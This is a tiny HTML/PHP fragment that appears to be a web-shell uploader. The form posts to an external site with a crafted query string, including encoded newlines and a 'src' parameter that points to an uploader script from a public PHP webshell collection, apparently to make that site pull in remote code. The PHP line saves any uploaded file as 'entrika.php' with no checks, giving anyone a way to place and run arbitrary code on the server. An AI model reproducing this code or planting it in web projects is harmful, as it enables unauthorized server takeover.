<FORM ENCTYPE="multipart/form-data" ACTION="https://hyipmaster.org/get.php?%0A%0Af=1C89E8&b=1C89E8&bg=F7E900&bw=2&h=31&plc=all&png=1&pngi=1&psn=Hyipmaster&src=HttP://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/Uploader.php" METHOD="POST">
<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="100000">
Send this file: <INPUT NAME="userfile" TYPE="file">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<?
move_uploaded_file($userfile, "entrika.php"); 
?>
